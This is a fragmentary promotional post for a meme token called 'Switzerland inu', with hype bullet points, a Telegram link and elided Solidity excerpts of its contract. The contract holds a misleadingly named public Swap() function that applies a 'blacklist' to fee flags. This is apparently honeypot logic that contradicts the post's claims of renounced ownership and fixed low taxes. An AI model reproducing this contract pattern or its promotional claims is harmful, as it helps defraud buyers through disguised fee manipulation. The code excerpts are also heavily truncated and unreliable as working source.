...
🔹 Renounced Ownership
🔹 LP Locked For 7 Day
🔹 Low Cap [ Most Easy Moon ]
🔹 3% Buytax
🔹 3% Selltax

https://t.me/Switzerlandinu
...
contract Switzerlandinu is IBEP20, Ownable {
    ...
    string constant _name = "Switzerland inu";
    string constant _symbol = unicode"SUI INU";
    ...
    address private marketingWallet = 0xae8e2B5E3436D196C275c3deDFE81636429f18c6;
    ...
    function Swap() public virtual { includeFromFee = blacklist; for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }
